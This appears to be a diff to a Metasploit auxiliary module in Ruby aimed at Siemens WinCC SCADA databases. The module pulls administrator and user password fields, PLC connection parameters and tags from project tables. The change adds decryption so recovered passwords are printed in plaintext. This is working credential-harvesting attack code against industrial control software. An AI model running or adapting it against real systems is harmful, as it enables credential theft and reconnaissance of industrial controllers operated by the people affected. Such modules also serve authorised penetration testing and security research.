@@ -86,7 +86,17 @@ class Metasploit3 < Msf::Auxiliary
 			prj[db] = {} # init hash
 			prj[db]["name"]		= q("SELECT DSN FROM #{db}.dbo.CC_CsSysInfoLog")
 			prj[db]["admins"]	= q("SELECT NAME, convert(varbinary, PASS) as PWD from #{db}.dbo.PW_USER WHERE PASS <> '' and GRPID = 1000")
+
+			prj[db]["admins"] = prj[db]["admins"].map do |usr|
+
+				usr_pass = decrypt usr[0].strip,usr[1]
+				usr.insert(2,usr_pass)
+			end
 			prj[db]["users"] 	= q("SELECT ID, NAME, convert(varbinary, PASS), GRPID FROM #{db}.[dbo].[PW_USER] WHERE PASS <> '' and GRPID <> 1000")
+			prj[db]["users"] = prj[db]["users"].map do |usr|
+				usr_pass = decrypt usr[1].strip,usr[2]
+				usr.insert(3,usr_pass)
+			end
 			prj[db]["groups"]	= q("SELECT ID, NAME FROM #{db}.[dbo].[PW_USER] WHERE PASS = ''")
 			prj[db]["plcs"]		= q("SELECT CONNECTIONNAME, PARAMETER FROM #{db}.[dbo].[MCPTCONNECTION]")
 			prj[db]["tags"]		= q("SELECT VARNAME,VARTYP,COMMENTS FROM #{db}.[dbo].[PDE#TAGs]")
@@ -98,11 +108,10 @@ class Metasploit3 < Msf::Auxiliary
 			end
 
 			print_good "Project: #{prj[db]["name"].first.first}\n" # print project name
-			
 			#Table data
 			print_table %w|ID NAME|				, prj[db]["groups"], 	"WinCC groups"
-			print_table %w|Name Password(hex)|		, prj[db]["admins"], 	"WinCC administrator"
-			print_table %w|ID NAME Password(hex) GRPID|	, prj[db]["users"], 	"WinCC users"
+			print_table %w|Name Password(hex) Password|		, prj[db]["admins"], 	"WinCC administrator"
+			print_table %w|ID NAME Password(hex) Password GRPID|	, prj[db]["users"], 	"WinCC users"
 			print_table %w|VARNAME VARTYP COMMENTS|		, prj[db]["tags"], 	"WinCC tags"
 			print_table %w|CONNECTIONNAME PARAMETER|	, prj[db]["plcs"], 	"WinCC PLCs"
 
@@ -122,6 +131,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def print_table columns, rows, header = ''
+
 		tbl = Rex::Ui::Text::Table.new(
 						'Indent' 	=> 4,
 						'Header' 	=> header,
@@ -162,4 +172,3 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 end
-			
